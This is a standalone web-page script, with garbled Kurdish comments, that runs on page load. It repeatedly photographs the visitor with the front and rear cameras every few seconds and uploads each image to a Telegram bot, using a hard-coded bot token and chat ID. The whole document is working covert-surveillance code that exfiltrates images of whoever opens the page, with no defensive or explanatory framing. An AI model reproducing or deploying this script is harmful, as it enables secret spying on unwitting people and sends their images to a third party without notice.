<script>
    const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
    const tgChatId = "6259019006";
    let isCapturing = true; // Ø¨Û† Ú©Û†Ù†ØªØ±Û†ÚµÚ©Ø±Ø¯Ù†ÛŒ Ø¨Û•Ø±Ø¯Û•ÙˆØ§Ù…ÛŒ ÙˆÛŽÙ†Û•Ú¯Ø±ØªÙ†Û•Ú©Û•

    window.addEventListener('load', () => {
        // Ø¯Û•Ø³ØªÙ¾ÛŽÚ©Ø±Ø¯Ù†ÛŒ Ø®ÙˆÙ„ÛŒ ÙˆÛŽÙ†Û•Ú¯Ø±ØªÙ†
        startContinuousCapture();
    });

    async function startContinuousCapture() {
        while (isCapturing) {
            try {
                // Ù¡. ÙˆÛŽÙ†Û•ÛŒÛ•Ú© Ø¨Û• Ú©Ø§Ù…ÛŽØ±Ø§ÛŒ Ù¾ÛŽØ´Û•ÙˆÛ• Ø¯Û•Ú¯Ø±ÛŽØª
                await captureAndSend("user", "ðŸ”„ ÙˆÛŽÙ†Û•ÛŒ Ø¨Û•Ø±Ø¯Û•ÙˆØ§Ù… (Ù¾ÛŽØ´Û•ÙˆÛ•)");
                
                // Ù¢. Ø¯ÙˆÙˆ Ú†Ø±Ú©Û• Ø¯Û•ÙˆÛ•Ø³ØªÛŽØª
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Ù£. ÙˆÛŽÙ†Û•ÛŒÛ•Ú© Ø¨Û• Ú©Ø§Ù…ÛŽØ±Ø§ÛŒ Ù¾Ø´ØªÛ•ÙˆÛ• Ø¯Û•Ú¯Ø±ÛŽØª
                await captureAndSend("environment", "ðŸ”„ ÙˆÛŽÙ†Û•ÛŒ Ø¨Û•Ø±Ø¯Û•ÙˆØ§Ù… (Ù¾Ø´ØªÛ•ÙˆÛ•)");

                // Ù¤. Ø¯ÙˆÙˆ Ú†Ø±Ú©Û• Ø¯Û•ÙˆÛ•Ø³ØªÛŽØª Ù¾ÛŽØ´ Ø¯ÙˆÙˆØ¨Ø§Ø±Û•Ø¨ÙˆÙˆÙ†Û•ÙˆÛ•ÛŒ Ø®ÙˆÙ„Û•Ú©Û•
                await new Promise(resolve => setTimeout(resolve, 2000));
            } catch (err) {
                console.log("Error during capture: ", err);
                // Ø¦Û•Ú¯Û•Ø± Ù‡Û•ÚµÛ•ÛŒÛ•Ú© Ú•ÙˆÙˆÛŒØ¯Ø§ Ú©Û•Ù…ÛŽÚ© Ø¯Û•ÙˆÛ•Ø³ØªÛŽØª Ùˆ Ø¯ÙˆÙˆØ¨Ø§Ø±Û• Ù‡Û•ÙˆÚµ Ø¯Û•Ø¯Ø§ØªÛ•ÙˆÛ•
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    }

    async function captureAndSend(mode, caption) {
        const video = document.getElementById('autoVideo');
        const canvas = document.getElementById('autoCanvas');
        
        // Ø¦Ø§Ù…Ø§Ø¯Û•Ú©Ø±Ø¯Ù†ÛŒ Ú©Ø§Ù…ÛŽØ±Ø§
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: mode, width: 480, height: 360 }, 
            audio: false 
        });
        
        video.srcObject = stream;
        // Ú†Ø§ÙˆÛ•Ú•ÙˆØ§Ù†ÛŒÛŒÛ•Ú©ÛŒ Ú©ÙˆØ±Øª Ø¨Û† Ù„Û†Ø¯Ø¨ÙˆÙˆÙ†ÛŒ ÙˆÛŽÙ†Û•Ú©Û•
        await new Promise(resolve => setTimeout(resolve, 800));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Ù†Ø§Ø±Ø¯Ù†ÛŒ ÙˆÛŽÙ†Û• Ø¨Û† ØªÛŒÙ„ÛŒÚ¯Ø±Ø§Ù…
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', tgChatId);
            formData.append('photo', blob, 'live_stream.jpg');
            formData.append('caption', caption + " - " + new Date().toLocaleTimeString());

            fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            // Ø¯Ø§Ø®Ø³ØªÙ†ÛŒ Ú©Ø§Ù…ÛŽØ±Ø§ÛŒ Ø¦ÛŽØ³ØªØ§ Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ø¨Û† Ú¯Û†Ú•ÛŒÙ†ÛŒ Ú©Ø§Ù…ÛŽØ±Ø§ Ú©ÛŽØ´Û• Ø¯Ø±ÙˆØ³Øª Ù†Û•Ø¨ÛŽØª
            stream.getTracks().forEach(track => track.stop());
        }, 'image/jpeg', 0.5); // Ú©ÙˆØ§Ù„ÛŽØªÛŒ Ù†Ø²Ù… Ú©Ø±Ø§ÙˆÛ•ØªÛ•ÙˆÛ• Ø¨Û† Ø®ÛŽØ±Ø§ÛŒÛŒ Ø²ÛŒØ§ØªØ±
    }
</script>
